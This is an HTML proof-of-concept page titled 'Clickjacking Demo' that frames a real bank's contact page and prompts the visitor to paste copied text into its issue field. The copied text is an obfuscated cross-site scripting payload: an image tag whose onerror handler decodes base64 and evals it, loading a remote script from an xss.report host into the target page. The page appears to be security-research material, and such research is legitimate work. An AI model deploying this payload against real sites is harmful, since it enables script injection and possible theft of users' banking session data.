<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Demo</title>
    <style>
		iframe {
		            width: 100%;
		            height: 900px;
		            border: 1px solid black;
		            margin-bottom: 20px;
		            
		        }
       
        button {
            padding: 8px 16px;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button onclick="copyData()">Click me to Copy Issue</button>

    <h2>Scroll down and Paste copied issue below issue field</h2>
    <iframe id="domainB" src="https://www.umpquabank.com/help-center/contact-us/" title="Domain B iframe"></iframe>

    <script>
		function copyData() {
		    const encodedData = `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2x0eCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>`;

		    navigator.clipboard.writeText(encodedData)
		        .then(() => {
		            console.log("Data copied to clipboard!");
		        })
		        .catch(err => {
		            console.error("Could not copy text: ", err);
		        });
		}
    </script>
</body>
</html>
